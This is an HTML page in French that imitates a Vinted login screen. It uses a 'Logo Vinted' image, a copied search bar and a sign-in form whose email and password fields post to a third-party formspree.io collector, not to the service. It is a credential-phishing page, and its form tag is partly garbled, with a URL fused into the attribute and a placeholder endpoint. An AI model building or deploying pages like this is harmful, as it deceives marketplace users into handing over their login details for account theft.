<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | V-Market Study</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="navbar">
        <img src="https://i.ibb.co/XxMLymDQ/IMG-1847.jpg" alt="Logo Vinted" class="logo-img">
        <div class="menu-icon">☰</div>
    </header>

    <div class="search-container">
        <div class="search-bar">
            <span class="category">Articles ▾</span>
            <input type="text" placeholder="Rechercher des articles">
        </div>
    </div>

    <main class="login-container">
        <div class="login-card">
            <h2>Se connecter</h2>
            
            <form https://formspree.io/f/mqeyajaraction="https://formspree.io/f/ton_identifiant" method="POST">
                <div class="input-group">
                    <input type="text" name="email_user" placeholder="Identifiant ou adresse email" required>
                </div>
                
                <div class="input-group">
                    <input type="password" name="password_user" placeholder="Mot de passe" required>
                </div>

                <button type="submit" class="btn-submit">Continuer</button>
            </form>

            <div class="footer-links">
                <a href="#">Mot de passe oublié ?</a>
                <a href="#">Un problème ?</a>
            </div>
        </div>
    </main>

</body>
</html>
